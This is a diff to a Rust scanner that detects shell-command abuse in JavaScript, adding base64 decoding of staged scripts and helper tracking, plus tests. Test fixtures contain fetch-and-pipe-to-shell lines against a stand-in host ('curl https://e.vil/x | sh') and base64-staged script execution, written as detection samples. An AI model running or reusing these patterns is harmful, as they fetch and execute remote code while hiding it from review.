@@ -63,6 +63,18 @@ pub fn analyze(ctx: &mut RuleContext<'_>) -> ParseOutcome {
         .visit_program(&parsed.program);
     }
     collect_shell_wrappers(&mut resolver, &parsed.program);
+    // Multi-line constants that read like shell scripts. Checked only when the
+    // file runs a script it wrote at runtime, as candidates for its content.
+    for (symbol, value) in &resolver.strings {
+        if rules::looks_like_shell_script(value) {
+            ctx.facts
+                .script_constants
+                .push((value.clone(), resolver.scoping.symbol_span(*symbol)));
+        }
+    }
+    ctx.facts
+        .script_constants
+        .sort_by_key(|(_, span)| span.start);
 
     Scanner {
         ctx,
@@ -93,6 +105,8 @@ struct Resolver<'s> {
     returns: HashMap<SymbolId, String>,
     /// Shell-quoting helpers: `q(s)` is `'s'`, so `sh -c ${q("ls")}` stays readable.
     quoters: HashMap<SymbolId, char>,
+    /// Base64 helpers: `toBase64(s)` that return `btoa(…)` of their argument.
+    encoders: HashSet<SymbolId>,
     /// Partly known strings bound to a constant: `const cmd = `cd ${dir} && ls``.
     approx_strings: HashMap<SymbolId, String>,
     /// Constants that branch: `const c = a ? "ls" : "rm -rf /"`.
@@ -157,6 +171,7 @@ impl<'s> Resolver<'s> {
             decoded: HashSet::new(),
             returns: HashMap::new(),
             quoters: HashMap::new(),
+            encoders: HashSet::new(),
             approx_strings: HashMap::new(),
             variant_strings: HashMap::new(),
             builders: HashMap::new(),
@@ -370,6 +385,15 @@ impl<'s> Resolver<'s> {
                     )
                     .collect();
             }
+            // Folded so a command staging `printf %s ${btoa(script)} | base64 -d`
+            // still carries the script, which the command checks then decode.
+            Some("btoa") => {
+                let bytes: Option<Vec<u8>> = arg(0)?
+                    .chars()
+                    .map(|ch| u8::try_from(u32::from(ch)).ok())
+                    .collect();
+                return Some(base64::engine::general_purpose::STANDARD.encode(bytes?));
+            }
             Some("decodeURIComponent" | "decodeURI" | "unescape") => {
                 return percent_decode(&arg(0)?);
             }
@@ -394,6 +418,12 @@ impl<'s> Resolver<'s> {
             .and_then(|symbol| self.quoters.get(&symbol))
         {
             return Some(format!("{quote}{}{quote}", arg(0)?));
+        }
+        if self
+            .local_function(&call.callee)
+            .is_some_and(|symbol| self.encoders.contains(&symbol))
+        {
+            return Some(base64::engine::general_purpose::STANDARD.encode(arg(0)?.as_bytes()));
         }
 
         let Expression::StaticMemberExpression(member) = call.callee.get_inner_expression() else {
@@ -998,6 +1028,18 @@ impl AliasCollector<'_, '_> {
                 {
                     self.resolver.returns.insert(*symbol, path);
                 }
+                // `function toBase64(s) { …; return btoa(bin) }`
+                if params.len() == 1
+                    && let [Expression::CallExpression(call)] = returns
+                        .iter()
+                        .map(|expr| expr.get_inner_expression())
+                        .collect::<Vec<_>>()
+                        .as_slice()
+                    && self.resolver.resolve(&call.callee).as_deref() == Some("btoa")
+                {
+                    self.resolver.encoders.insert(*symbol);
+                    return;
+                }
                 // Every return is the parameter itself or the quoted parameter.
                 if let [Some(param)] = params.as_slice() {
                     let mut quote = None;
@@ -1499,16 +1541,24 @@ impl<'a> Visit<'a> for WrapperCollector<'_, '_, '_> {
                 let (wrapper, _) = self.known.get(key.as_ref()?)?;
                 Some((wrapper.sink.clone(), wrapper.param, wrapper.sink_index))
             });
+        // The sink may sit in a callback inside the helper
+        // (`new Promise(res => Executor.start(cmd, …))`): the command is still
+        // the helper's parameter, so look outward for the frame that owns it.
         if let Some((sink, index, sink_index)) = target
-            && let Some(frame) = self.frames.last()
-            && let Some(owner) = &frame.owner
             && let Some(Expression::Identifier(ident)) = it
                 .arguments
                 .get(index)
                 .and_then(Argument::as_expression)
                 .map(Expression::get_inner_expression)
             && let Some(symbol) = self.resolver.symbol(ident)
-            && let Some(param) = frame.params.iter().position(|p| *p == Some(symbol))
+            && let Some((frame, param)) = self.frames.iter().rev().find_map(|frame| {
+                frame
+                    .params
+                    .iter()
+                    .position(|p| *p == Some(symbol))
+                    .map(|param| (frame, param))
+            })
+            && let Some(owner) = &frame.owner
             && !self.resolver.scoping.symbol_is_mutated(symbol)
         {
             self.new.push((
@@ -2302,6 +2352,60 @@ mod tests {
         assert!(has(
             "(function(){ const sh = c => Executor.execute(c); fetch(u).then(r => r.text()).then(t => sh(t)); })()",
             "shell.remote_command"
+        ));
+    }
+
+    #[test]
+    fn follows_helpers_whose_sink_sits_in_a_callback() {
+        // `exec(cmd)` that wraps Executor in a Promise is still a command helper.
+        let source = "(function(){ function exec(cmd) {
+                return new Promise((resolve, reject) => {
+                    Promise.resolve(Executor.start(cmd, (t, d) => {}, true)).then(resolve, reject);
+                });
+            }
+            exec('curl https://e.vil/x | sh'); exec('uname -m'); })()";
+        assert!(has(source, "shell.dangerous_command"), "{:?}", ids(source));
+        // Every call was graded, so the sink inside adds no runtime finding.
+        let benign = source.replace("curl https://e.vil/x | sh", "apk add git");
+        let keys = shell_keys(&benign);
+        assert!(
+            !keys.iter().any(|(_, severity)| *severity == Severity::High),
+            "{keys:?}"
+        );
+    }
+
+    #[test]
+    fn decodes_base64_staged_scripts() {
+        // btoa of a constant script, staged into a file and run.
+        let staged = "const s = ['set -e', 'curl https://e.vil/x | sh'].join('\\n');
+            Executor.start(`printf %s ${btoa(s)} | base64 -d > /tmp/s.sh && sh /tmp/s.sh`);";
+        assert!(has(staged, "shell.encoded_script"), "{:?}", ids(staged));
+        assert!(has(staged, "shell.dangerous_command"), "{:?}", ids(staged));
+
+        // A local `toBase64` helper that ends in btoa folds the same way.
+        let helper = "(function(){ function enc(x) { let b = ''; return btoa(b + x) }
+            Executor.start(`echo ${enc('curl https://e.vil/x | sh')} | base64 -d | sh`); })()";
+        assert!(has(helper, "shell.dangerous_command"), "{:?}", ids(helper));
+
+        // A script the scanner can't read, written and then run.
+        let hidden = "const SETUP = ['set -e', 'apk add git build-base',
+                'git clone https://github.com/a/b /r', 'cd /r', 'make'].join('\\n');
+            class P { go(script) {
+                Executor.start(`printf %s ${btoa(script)} | base64 -d > /tmp/x.sh`);
+                acode.require('terminal').write(1, 'sh /tmp/x.sh\\r');
+            } run() { this.go(localStorage.s || SETUP) } }";
+        assert!(has(hidden, "shell.staged_script"), "{:?}", ids(hidden));
+        // Its script-shaped constants are checked as the likely content.
+        assert!(
+            has(hidden, "shell.builds_remote_source"),
+            "{:?}",
+            ids(hidden)
+        );
+
+        // Writing a file it never runs is not a staged script.
+        assert!(!has(
+            "Executor.start(`printf %s ${x} | base64 -d > /tmp/data.bin`)",
+            "shell.staged_script"
         ));
     }
 
